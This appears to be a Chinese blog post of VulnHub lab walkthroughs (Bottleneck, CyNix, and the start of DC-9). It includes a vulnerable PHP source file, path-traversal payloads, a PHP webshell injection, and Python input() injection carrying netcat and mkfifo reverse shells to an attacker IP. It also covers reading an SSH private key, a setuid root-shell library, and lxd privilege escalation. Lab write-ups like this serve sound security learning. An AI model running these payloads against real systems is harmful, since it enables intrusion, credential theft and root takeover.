<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function print_troll()&#123;</span><br><span class="line">    $messages &#x3D; $GLOBALS[&#39;messages&#39;];</span><br><span class="line">    $troll &#x3D; $GLOBALS[&#39;troll&#39;];</span><br><span class="line">    echo $messages[0];</span><br><span class="line">    echo $troll;</span><br><span class="line">&#125;</span><br><span class="line">$troll &#x3D; &lt;&lt;&lt;EOT</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">                                   _,..._</span><br><span class="line">                                  &#x2F;__    \</span><br><span class="line">                                   &gt;&lt; &#96;.  \</span><br><span class="line">                                  &#x2F;_    \ |</span><br><span class="line">                                   \-_  &#x2F;:|</span><br><span class="line">                                 ,--&#39;..&#39;. :</span><br><span class="line">                               ,&#39;         &#96;.</span><br><span class="line">                            _,&#39;             \</span><br><span class="line">                   _.._,--&#39;&#39;    ,           |</span><br><span class="line">               , ,&#39;,, _|    _,.&#39;|      |    |</span><br><span class="line">            \\||&#x2F;,&#39;(,&#39; &#39;--&#39;&#39;    |      |    |</span><br><span class="line">       _     |||                |      &#x2F;-&#39;  |</span><br><span class="line">      | |   (- -)&lt;&#96;._           |     &#x2F;    &#x2F;</span><br><span class="line">      | |  \_\O&#x2F;_&#x2F;&#96;-.(&lt;&lt;        |____&#x2F;    &#x2F;</span><br><span class="line">      | |   &#x2F;   \              &#x2F; -&#39;| &#96;--.&#39;|</span><br><span class="line">      | |   \___&#x2F;             &#x2F;           &#x2F;</span><br><span class="line">      | |    H H             &#x2F;     |     |</span><br><span class="line">      |_|_..-H-H--.._       &#x2F;     ,|     |</span><br><span class="line">        |-.._&quot;_&quot;__..-|     |   _-&#x2F; |     |</span><br><span class="line">        |            |     |    |   \_   |</span><br><span class="line">        |            |     |    |   |    |</span><br><span class="line">        |            |     |____|   |    |</span><br><span class="line">        |            |  _..&#39;    |   |____|</span><br><span class="line">        |            |_(____..._&#39; _.&#39;    |</span><br><span class="line">        &#96;-..______..-&#39;&quot;&quot;         (___..--&#39;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">EOT;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;t&#39;]) || !isset($_GET[&#39;f&#39;]))&#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$imagefile &#x3D; base64_decode($_GET[&#39;f&#39;]);</span><br><span class="line">$timestamp &#x3D; time();</span><br><span class="line">$isblocked &#x3D; FALSE;</span><br><span class="line">$blacklist &#x3D; array(&#39;&#x2F;etc&#39;,&#39;&#x2F;opt&#39;,&#39;&#x2F;var&#39;,&#39;&#x2F;opt&#39;,&#39;&#x2F;proc&#39;,&#39;&#x2F;dev&#39;,&#39;&#x2F;lib&#39;,&#39;&#x2F;bin&#39;,&#39;&#x2F;usr&#39;,&#39;&#x2F;home&#39;,&#39;&#x2F;ids&#39;);</span><br><span class="line">$messages &#x3D; array(&quot;\nLet me throw away your nice request into the bin.\n&quot;.</span><br><span class="line">    &quot;The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my infrastructructure I will take strong legal measures.\n&quot;.</span><br><span class="line">    &quot;Why don&#39;t you wait on your chair until someone (maybe the police) knock on your door?\n\n&quot;);</span><br><span class="line"></span><br><span class="line">if(abs($_GET[&#39;t&#39;] - $timestamp) &gt; 10)&#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">foreach($blacklist as $elem)&#123;</span><br><span class="line">    if(strstr($imagefile, $elem) !&#x3D;&#x3D; FALSE)</span><br><span class="line">        $isblocked &#x3D; TRUE;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; report the intrusion to the soc and save information locally for further investigation</span><br><span class="line">if($isblocked)&#123;</span><br><span class="line">    $logfile &#x3D; &#39;intrusion_&#39;.$timestamp;</span><br><span class="line">    $fp &#x3D; fopen(&#39;&#x2F;var&#x2F;log&#x2F;soc&#x2F;&#39;.$logfile, &#39;w&#39;);</span><br><span class="line">    fwrite($fp, &quot;&#39;&quot;.$imagefile.&quot;&#39;&quot;);</span><br><span class="line">    fclose($fp);</span><br><span class="line">    exec(&#39;python &#x2F;opt&#x2F;ids_strong_bvb.py                     &lt;&#x2F;var&#x2F;log&#x2F;soc&#x2F;&#39;.$logfile.&#39; &gt;&#x2F;tmp&#x2F;output 2&gt;&amp;1&#39;);</span><br><span class="line">    print_troll();</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">chdir(&#39;img&#39;);</span><br><span class="line">$filecontent &#x3D; file_get_contents($imagefile);</span><br><span class="line">if($filecontent &#x3D;&#x3D;&#x3D; FALSE)&#123;</span><br><span class="line">    print_troll();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo $filecontent;</span><br><span class="line">&#125;</span><br><span class="line">chdir(&#39;..&#x2F;&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>那现在就来分析一波源码吧(太菜了 我也看了好久)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$imagefile &#x3D; base64_decode($_GET[&#39;f&#39;]);</span><br><span class="line">$timestamp &#x3D; time();</span><br><span class="line">$isblocked &#x3D; FALSE;</span><br><span class="line">$blacklist &#x3D; array(&#39;&#x2F;etc&#39;,&#39;&#x2F;opt&#39;,&#39;&#x2F;var&#39;,&#39;&#x2F;opt&#39;,&#39;&#x2F;proc&#39;,&#39;&#x2F;dev&#39;,&#39;&#x2F;lib&#39;,&#39;&#x2F;bin&#39;,&#39;&#x2F;usr&#39;,&#39;&#x2F;home&#39;,&#39;&#x2F;ids&#39;);</span><br></pre></td></tr></table></figure>

<p>这里就是文件名的解析和时间戳的部分了，注意到还有一个黑名单 这些都不能用</p>
<p>用了就会输出刚才那条敲门的警告消息</p>
<p>但是这句执行py文件的就有点东西了嗷</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec(&#39;python &#x2F;opt&#x2F;ids_strong_bvb.py &lt;&#x2F;var&#x2F;log&#x2F;soc&#x2F;&#39;.$logfile.&#39; &gt;&#x2F;tmp&#x2F;output 2&gt;&amp;1&#39;);</span><br></pre></td></tr></table></figure>

<p>那么就是说执行这个py文件的时候，会操作soc日志文件，然后写一些东西到/tmp/output这个文件里面去 黑名单里面没有/tmp 所有现在就想读一下这个文件 看写进去的到底是什么 这里又看到代码里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.当参数f的值在黑名单里面的时候 会触发警告消息 直接退出</span><br><span class="line">if($isblocked) 之前会检查是否在黑名单里 在的话 这个值会变成true就 然后就会打印警告消息</span><br><span class="line">2.还有一个就是当文件内容为空的时候</span><br><span class="line">if($filecontent &#x3D;&#x3D;&#x3D; FALSE)&#123;</span><br><span class="line">    print_troll();</span><br><span class="line">&#125; 这里判断文件是否为为 为空则打印警告消息</span><br></pre></td></tr></table></figure>

<p>我直接用下面这个字典的时候 输出了警告消息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br></pre></td></tr></table></figure>

<p>那不应该啊 /tmp不在黑名单里面 那么就是这个文件为空 又上去看代码 为什么为空呢 然后又注意到 它执行写东西到文件的条件是 $isblocked为true 那么我们就需要他执行一次 /tmp/output里面才有内容 所以在读文件之前 要先fuzz一个黑名单里的内容</p>
<p>所有又构造字典如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br></pre></td></tr></table></figure>

<p>再读一下 然后查看结果文件</p>
<img data-src="/images/vulnhub/botteneck img/15.png" style="zoom:50%;" />

<p>嗯？ 这个是什么东西 我看了半天看不出所以然 不过还是可以想到第一个payload触发了执行写日志 所以这个report： 应该就是输出到日志的东西</p>
<p>但是这个/tmp/output 我看不懂 所以就直接问<strong>ins1ght</strong>老哥了</p>
<p>又去google了一波 发现有些日志文件是可以反弹shell的 那我们就直接再fuzz一波</p>
<p>构造payload：(构造这个的时候如果是在windows记得把防火墙关了 不关会报病毒)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd&lt;?php system($_GET[&#39;cmd&#39;])?&gt;</span><br><span class="line">&#x2F;tmp&#x2F;output&amp;cmd&#x3D;ls</span><br><span class="line">&#x2F;tmp&#x2F;output&amp;cmd&#x3D;getuid</span><br><span class="line">&#x2F;tmp&#x2F;output&amp;cmd&#x3D;whoami</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output(最后要记得加一个这个 读这个日志文件的内容)</span><br></pre></td></tr></table></figure>

<p>然后执行一波 看能不能反弹shell</p>
<img data-src="/images/vulnhub/botteneck img/16.png" style="zoom:50%;" />

<p>果然没有想象中的那么美好 没有反弹shell 不过倒是有个报错 这个报错是什么意思？</p>
<p>先google一波看看 emm 毛都没有 还是在问问<strong>ins1ght</strong>老哥</p>
<p>老哥说要利用Python2的input的漏洞来getshell 那么下面就开始走上getshell的不归路了</p>
<h2 id="0x02-input-getshell"><a href="#0x02-input-getshell" class="headerlink" title="0x02 input+getshell"></a>0x02 input+getshell</h2><p><strong>ins1ght</strong>老哥这里推荐几个关于python2的input漏洞的文章</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzc1NDkxLmh0bWw=" title="https://www.secpulse.com/archives/75491.html">SecPulse<i class="fa fa-external-link"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5tb29uc2VjLmNvbS9wb3N0LTcxNy5odG1s" title="http://www.moonsec.com/post-717.html">暗月moonsec博客<i class="fa fa-external-link"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjI4OQ==" title="https://xz.aliyun.com/t/2289">先知上一篇关于Python反序列化漏洞利用的文章<i class="fa fa-external-link"></i></span></p>
<p>我们知道 在python2里面有input和raw_input 两个函数</p>
<p>raw_input将所有输入作为字符串看待，返回字符串类型，而 input() 相当于 eval(raw_input(prompt)) ，如果来自标准输入的数据是一个恶意的表达式语句，则存在任意代码执行 那么我们就可以利用一下这个点来getshell</p>
<p>然后打开python2测试一下 有、东西 奥利给</p>
<img data-src="/images/vulnhub/botteneck img/17.png" style="zoom:50%;" />

<p>按道理说应该是可以在kali攻击机上执行nc 然后我又开了一台ubuntu来作测试 再监听端口 确实可以的</p>
<p>那么现在就可以构造如下payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#39;__import__(&#39;os&#39;).system(&quot;nc -e &#x2F;bin&#x2F;bash 192.168.1.107 8080&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p>好的 那么第一次失败了 问了问老哥 说加个and 如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#39;and __import__(&#39;os&#39;).system(&quot;nc -e &#x2F;bin&#x2F;bash 192.168.1.107 8080&quot;) and&#39;</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br></pre></td></tr></table></figure>

<p> 看一下返回的结果 什么意思？ 无效的参数 -e</p>
 <img data-src="/images/vulnhub/botteneck img/18.png" style="zoom:50%;" />

<p>百度一波 原来是ubuntu默认不使用-e参数 那怎么办？</p>
<p>又构造了下面这个payload(这个payload是借鉴学习了<strong>ins1ght</strong>老哥的)</p>
<p>第一次使用下面这个payload试一(正向shell kali主动去连接靶机)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1)&#x2F;etc&#39; and __import__(&#39;os&#39;).system(&#39;rm -f &#x2F;tmp&#x2F;f; mkfifo &#x2F;tmp&#x2F;f; cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1 | nc -l 127.0.0.1 8080 &gt;&#x2F;tmp&#x2F;f&#39;) and&#39;</span><br><span class="line">2)然后在kali上使用 nc 192.168.1.107 8080</span><br></pre></td></tr></table></figure>

<p>第二次使用了反向的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#39; and __import__(&quot;os&quot;).system(&quot;rm -f &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.1.105 8080 &gt;&#x2F;tmp&#x2F;f&quot;) and&#39;</span><br></pre></td></tr></table></figure>

<p>kali机监听8080端口 反弹shel成功 先看一下权限(权限很明显是最低的用户权限)</p>
<img data-src="/images/vulnhub/botteneck img/19.png" style="zoom:50%;" />

<p>payload可以反弹shell msf也可以来反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload cmd&#x2F;unix&#x2F;reverse_netcat_gaping</span><br><span class="line">set lhost 192.168.1.105</span><br><span class="line">set lport 8080</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/botteneck img/20.png" style="zoom:50%;" />

<p>也是成功反弹shell</p>
<p>那么现在反弹shell成功了 但是是普通用户 想把权限提到root 那下面就提权</p>
<h2 id="0x03-提升用户权限"><a href="#0x03-提升用户权限" class="headerlink" title="0x03 提升用户权限"></a>0x03 提升用户权限</h2><p>先看一下现在的用户有什么可以执行的文件(SUID权限可执行文件)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/botteneck img/21.png" style="zoom:50%;" />

<p> 都是一些很正常的文件 前面的一个一个看了一下 到了/usr/bin/at的时候发现有点东西 kali里面搜了一下 果然有点东西(kali就是好啊) </p>
<img data-src="/images/vulnhub/botteneck img/22.png" style="zoom:50%;" />

<p>google一下 发现是个Tru64 UNIX 4.0g的洞 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMjgx" title="https://www.exploit-db.com/exploits/281">exploit-db<i class="fa fa-external-link"></i></span>上有</p>
<p>我就不多说了 后面的步骤都是借鉴的<strong>ins1ght</strong>老哥的(谢谢<strong>ins1ght</strong>老哥在线解答疑惑QAQ)</p>
<p>先找一下全局用户可写文件，把结果输出到文件，然后用grep加关键字去筛选</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -writable -type f 2&gt;&#x2F;dev&#x2F;null &gt;&#x2F;tmp&#x2F;report.txt</span><br><span class="line">grep -Ev &#39;&#x2F;proc|&#x2F;sys&#39; &#x2F;tmp&#x2F;report.txt</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/botteneck img/23.png" style="zoom:50%;" />

<p> 再查找一下sudo命令权限 sudo -l </p>
<img data-src="/images/vulnhub/botteneck img/24.png" style="zoom:50%;" />

<p>发现有个bytevsbyte用户的创建的软链接 进去看看</p>
<img data-src="/images/vulnhub/botteneck img/25.png" style="zoom:50%;" />

<p>链接到了/opt/clear_logs.sh文件上 再去看看</p>
<img data-src="/images/vulnhub/botteneck img/26.png" style="zoom:50%;" />

<p>只有<code>bytevsbyte</code>用户有修改权限</p>
<p>然后 用linuxprivchecker.py跑一下 网络信息 lo:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br></pre></td></tr></table></figure>

<p><strong>ins1ght</strong>老哥试了最新的 command-line network traffic analyzer Sudo version 1.8.27 提权漏洞 但是不行 又试了 用LinEnum.sh跑一下 /usr/bin/screen 但靶机没有安装gcc 又气又恨</p>
<p>那么我们换一种思路 能不能切换bytevsbyte用户 然后执行一下clear_logs.sh</p>
<p>看能不能获取root有关的信息 那么现在就只有通过这个点来突破</p>
<p>我们发现clear_logs可以被www-data无密码执行，但只能作为bytevsbyte用户去执行，也就是说拥有的权限也只是bytevsbyte权限，而不是root权限。所以我们可以修改clear_logs软链接的指向，指向我们的脚本，随后运行clear_logs就可以从www-data用户变成bytevsbyte</p>
<p>那我们现在kali上先创建clear_logs.sh, 然后开启HTTP服务，然后使用wget下载clear_logs到靶机，在使用wget下载的时候加上-O选项将下载的文件“重命名”为clear_logs_copy</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;web_untils</span><br><span class="line">wget -O clear_logs_copy http:&#x2F;&#x2F;192.168.1.105&#x2F;clear_logs</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/botteneck img/27.png" style="zoom:50%;" />

<p>但是当我们覆盖clear_logs的时候实际上修改却是去/opt/clear_logs.sh</p>
<p>这里应该先修改clear_logs软链接的指向，使其指向clear_logs_copy。还记得要给clear_logs_copy赋予可执行权限，下载之后，clear_logs_copy并没有可执行权限。如果没有可执行权限，最后执行命令的时候，会出现错误command not found</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 clear_logs_copy</span><br><span class="line">使用ln -snf修改软链接的指向，使其指向我们的脚本</span><br><span class="line">ln -snf &#x2F;var&#x2F;www&#x2F;html&#x2F;web_utils&#x2F;clear_logs_copy &#x2F;var&#x2F;www&#x2F;html&#x2F;web_utils&#x2F;clear_logs</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/botteneck img/28.png" style="zoom:50%;" />

<p>之后执行/var/www/html/web_utils/clear_logs，就可以切换到bytevsbyte用户，就可以进到相应目录读取到bytevsbyte用户的flag 了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -ubytevsbyte &#x2F;var&#x2F;www&#x2F;html&#x2F;web_untils&#x2F;clear_logs</span><br></pre></td></tr></table></figure>

<p>但是直接执行这条命令 会报一个错 那我就纳闷了 这是啥错啊 google也没有</p>
<p>到最后还是问了<strong>ins1ght</strong>老哥(<strong>ins1ght</strong>老哥tql) 这里要用python生成一个tty</p>
<p>然后老哥给了一条命令 执行之后就获得了一个交互式的shell了 就可以切换用户了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; # 有些没有安装Python2，所以需要换成python3 -c</span><br></pre></td></tr></table></figure>

<p>执行之后：(这可来的有点不容易了 卡了我一个晚上)</p>
<img data-src="/images/vulnhub/botteneck img/29.png" style="zoom:50%;" />

<p> 之后在执行sudo：(直接就切换到了bytevsbyte用户) </p>
<img data-src="/images/vulnhub/botteneck img/30.png" style="zoom:50%;" />

<p> 然后就可以去cat flag了 哈哈哈哈 </p>
<img data-src="/images/vulnhub/botteneck img/31.png" style="zoom:50%;" />

<h2 id="0x04-提权到root权限"><a href="#0x04-提权到root权限" class="headerlink" title="0x04 提权到root权限"></a>0x04 提权到root权限</h2><p>那么现在我们是拿到了bytevsbyte的用户权限了 www-data是最低的权限</p>
<p>现在就可用更高一级的bytevsbyte去寻找更多东西了 看能不能提升到root权限</p>
<p>重新再找一遍SUID权限的可执行文件</p>
<img data-src="/images/vulnhub/botteneck img/32.png" style="zoom:50%;" />

<p>这个/usr/test/testlib可就有点东西了 继续深入看看 在这个目录下发现了它的c源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])&#123;</span><br><span class="line">    void *handle;</span><br><span class="line">    int (*function)();</span><br><span class="line">    if(argc &lt; 2)</span><br><span class="line">        return 1;</span><br><span class="line">    handle &#x3D; dlopen(argv[1], RTLD_LAZY);</span><br><span class="line">    function &#x3D; dlsym(handle, &quot;test_this&quot;);</span><br><span class="line">    function();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>emm c的代码好久不接触了 有点不太熟了 先百度了一下这两个函数是不是有什么对应的漏洞 google一波发现这是两个动态调用函数 可以加载动态链接库 那么可以猜出来就是从这两个函数下手了 网上找找exploit <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ppdm9pL3BlbnRlc3QvYmxvYi9tYXN0ZXIvc2hlbGwvcm9vdHNoZWxsLmM=" title="https://github.com/jivoi/pentest/blob/master/shell/rootshell.c">exp的github地址<i class="fa fa-external-link"></i></span></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; gcc -o &#x2F;tmp&#x2F;rootshell &#x2F;tmp&#x2F;rootshell.c</span><br><span class="line">&#x2F;&#x2F; chmod u+s &#x2F;tmp&#x2F;rootshell</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">setuid(0); setgid(0); system(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>记得前面要记得加一个#include&lt;stdlib.h&gt;头文件 否则gcc编译不成功 然后在kali</p>
<p>机上编译成动态链接库文件 从代码来看 文件名需要取成test_this.c</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared test_this.c -o test_this.so</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/botteneck img/33.png" style="zoom:50%;" />

<p>OK 编译成功 然后在靶机上下载这个so文件 然后直接执行</p>
<p>这里还有一点 不能直接在/usr/test目录下下载 会没有权限而报错 要去/tmp目录下下载</p>
<img data-src="/images/vulnhub/botteneck img/34.png" style="zoom:50%;" />

<img data-src="/images/vulnhub/botteneck img/35.png" style="zoom:50%;" />

<p>然后执行这个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;test&#x2F;testlib &#x2F;tmp&#x2F;test_this.so</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/botteneck img/37.png" style="zoom:50%;" />

<img data-src="/images/vulnhub/botteneck img/38.png" style="zoom:50%;" />

<p>一路做下来 碰到很多问题 从一开始发现漏洞到利用漏洞反弹shell 然后提升权限 最后到root权限(期间非常感谢<strong>ins1ght</strong>老哥为我解答疑惑)</p>
<p>这是第一篇walkthrough 后面应该还会继续做做其他的靶机</p>
<p>By Oslo(A fake hacker)</p>
<h1 id="CyNix-Walkthrough"><a href="#CyNix-Walkthrough" class="headerlink" title="CyNix Walkthrough"></a>CyNix Walkthrough</h1><p>第一步先开启靶机 是个Ubuntu的</p>
<img data-src="/images/vulnhub/CyNix img/1.png" style="zoom:50%;" />

<img data-src="C:\Users\Administrator\Desktop\Folders\blog\CyNix img\2.png" style="zoom:50%;" />

<p>开了个6688的ssh端口 后面再看 现在用gobuster扫一遍</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.0.106 -w &#x2F;root&#x2F;桌面&#x2F;big_dict.txt -x .php,.html,.zip</span><br></pre></td></tr></table></figure>

<p>用这个字典没有扫到有什么有用的页面 可以用gobuster自带的扫一下</p>
<img data-src="/images/vulnhub/CyNix img/3.png" style="zoom:50%;" />

<p>有个lavalamp 访问一下  这是个新页面 先看看有没有其他东西</p>
<img data-src="/images/vulnhub/CyNix img/4.png" style="zoom:50%;" />

<p>右上角有个contact 就会到下面的联系界面 如下</p>
<img data-src="/images/vulnhub/CyNix img/5.png" style="zoom:50%;" />

<p>emm 先尝试了一波 什么都没有 又查看了一下源码 也什么都没有 再抓个包试试  抓包就会看到有东西了 这里会看到数据post到了canyoubypassme.php</p>
<img data-src="/images/vulnhub/CyNix img/6.png" style="zoom:80%;" />

<p>页面长这样  还是动态的  首先查看一下源码 注意到一个东西</p>
<img data-src="/images/vulnhub/CyNix img/7.png" style="zoom:50%;" />

<img data-src="C:\Users\Administrator\Desktop\Folders\blog\CyNix img\8.png" style="zoom:150%;" />

<p>那我想应该页面会有个输入框输入数字啊 怎么没有呢  f12查看一下元素 </p>
<p>果然 有个东西设置了透明 给他设置成1.0 就可以看到了</p>
<img data-src="/images/vulnhub/CyNix img/9.png" style="zoom:50%;" />

<p>然后看到代码里面 有个file 抓个包试试  猜这里应该有个文件读取</p>
<img data-src="/images/vulnhub/CyNix img/10.png" style="zoom:80%;" />

<p>果然 先读一下/etc/passwd  但是读取不成功</p>
<img data-src="/images/vulnhub/CyNix img/11.png" style="zoom:80%;" />

<p>这里应该是要自己构造payload来bypass 直接用字典fuzz就行</p>
<p>找出来一个这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/CyNix img/12.png" style="zoom:80%;" />

<p>注意到这里有个用户ford和lxd</p>
<p>先用ssh登录用户ford试试  拒绝连接 后面有个publickey 应该和ssh密钥有关</p>
<img data-src="/images/vulnhub/CyNix img/14.png" style="zoom:80%;" />

<p>那就可以先读一下用户的ssh密钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;ford&#x2F;.ssh&#x2F;id_rsa</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/CyNix img/15.png" style="zoom:50%;" />

<p>复制到攻击机的id_rsa文件里面 然后指定秘钥文件登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh ford@192.168.0.106 -p 6688 -i id_rsa</span><br></pre></td></tr></table></figure>

<p>这里还要注意一点 id_rsa文件还要修改权限为700 才可登录 下面登录成功</p>
<p>下面就是提权了  注意到之前读取passwd文件的时候  有个lxd 提权应该靠它了</p>
<img data-src="/images/vulnhub/CyNix img/17.png" style="zoom:50%;" />

<p>还是先查看一下SUID权限可执行文件 查看权限等等 都没有啥有用的东西</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">sudo -l </span><br><span class="line">cat &#x2F;etc&#x2F;crontab</span><br></pre></td></tr></table></figure>

<p>那就还是使用lxd提权  先在kali本机上生成一个镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;saghul&#x2F;lxd-alpine-builder.git</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/CyNix img/18.png" style="zoom:60%;" />

<p>生成后再在本机用python开启http服务 然后在靶机上面wget下载</p>
<img data-src="/images/vulnhub/CyNix img/19.png" style="zoom:60%;" />



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lxc image import .&#x2F;alpine-v3.11-x86_64-20200212_0116.tar.gz --alias osloimage</span><br><span class="line">lxc image list</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/CyNix img/20.png" style="zoom:60%;" />

<p>然后在新的容器中出初始化镜像 然后在/root目录加载初始化后的容器</p>
<img data-src="/images/vulnhub/CyNix img/21.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/CyNix img/22.png" style="zoom:60%;" />

<p>By oslo(A fake hacker)</p>
<h1 id="DC-9-Walkthrough"><a href="#DC-9-Walkthrough" class="headerlink" title="DC-9 Walkthrough"></a>DC-9 Walkthrough</h1><p>第一步还是先Virtualbox导入靶机  然后正常开启就行了  这次是个Debian</p>
<p>然后nmap扫一下确定靶机IP：192.168.0.114  先访问一下看看</p>
<img data-src="/images/vulnhub/DC-9 img/1.png" style="zoom:60%;" />

<p>页面长这样</p>
<img data-src="/images/vulnhub/DC-9 img/2.png" style="zoom:50%;" />

<p>然后扫一下端口  就开日常的22和80端口  没啥特殊的 就不放图了</p>
<p>然后扫一下目录 dirsearch和gobuster  扫完之后只有一些常规页面 没有其他敏感信息</p>
<img data-src="/images/vulnhub/DC-9 img/3.png" style="zoom:50%;" />

<p>但是发现有个search.php  查询页面  会不会有注入呢？ 试一下</p>
